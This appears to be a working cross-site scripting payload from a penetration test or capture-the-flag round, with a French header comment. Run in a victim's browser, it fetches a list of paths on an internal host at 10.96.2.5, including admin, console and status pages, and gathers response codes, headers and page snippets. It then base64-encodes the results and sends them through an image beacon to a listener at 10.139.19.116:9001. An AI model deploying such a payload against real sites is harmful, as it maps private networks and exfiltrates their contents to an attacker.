// Vantage — XSS round 4 : identifier 10.96.2.5 (service interne)
(function () {
  var L = 'http://10.139.19.116:9001/';
  var results = [];
  function send() {
    var out = results.join('\n===RES===\n');
    try { new Image().src = L + 'id5?d=' + encodeURIComponent(btoa(unescape(encodeURIComponent(out)))); } catch (e) {}
  }
  var urls = ['http://10.96.2.5/', 'http://10.96.2.5/status', 'http://10.96.2.5/health',
              'http://10.96.2.5/admin', 'http://10.96.2.5/purge', 'http://10.96.2.5/server-status',
              'http://10.96.2.5/v1', 'http://10.96.2.5/api', 'http://10.96.2.5/info',
              'http://10.96.2.5/robots.txt', 'http://10.96.2.5/console.php', 'http://10.96.2.5/index.php',
              'http://10.96.2.5/schedule.php', 'http://10.96.2.5/review.php'];
  var done = 0;
  urls.forEach(function (u) {
    fetch(u, { credentials: 'omit' })
      .then(function (r) {
        var hd = '';
        ['server', 'content-type', 'x-cache', 'x-powered-by'].forEach(function (k) {
          try { var v = r.headers.get(k); if (v) hd += k + '=' + v + ' '; } catch (e) {}
        });
        return r.text().then(function (t) { results.push(u + ' | HTTP' + r.status + ' | ' + hd + ' | ' + t.slice(0, 300).replace(/\n/g, ' ')); });
      })
      .catch(function (e) { results.push(u + ' | ERR ' + e); })
      .then(function () { if (++done === urls.length) send(); });
  });
  setTimeout(send, 12000);
})();
